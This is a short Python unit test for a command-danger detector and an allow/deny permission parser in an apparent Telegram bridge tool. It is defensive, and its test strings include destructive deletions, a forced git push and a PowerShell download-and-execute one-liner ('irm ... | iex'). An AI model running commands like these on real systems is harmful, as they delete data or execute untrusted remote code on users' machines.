from __future__ import annotations

from telegram_bridge.danger import is_dangerous_command
from telegram_bridge.permission import permission_from_answer


def main() -> None:
    assert not is_dangerous_command("dir")
    assert not is_dangerous_command("echo hello")
    assert not is_dangerous_command("git status")
    assert not is_dangerous_command("python -m compileall telegram_bridge")
    assert is_dangerous_command("rm -rf C:\\temp")
    assert is_dangerous_command("git push --force origin main")
    assert is_dangerous_command("Remove-Item -Recurse -Force C:\\tmp")
    assert is_dangerous_command("irm http://example.com | iex")
    assert permission_from_answer("Разрешить") == "allow"
    assert permission_from_answer("Запретить") == "deny"
    assert permission_from_answer("whatever") == "deny"
    print("unit-ok")


if __name__ == "__main__":
    main()
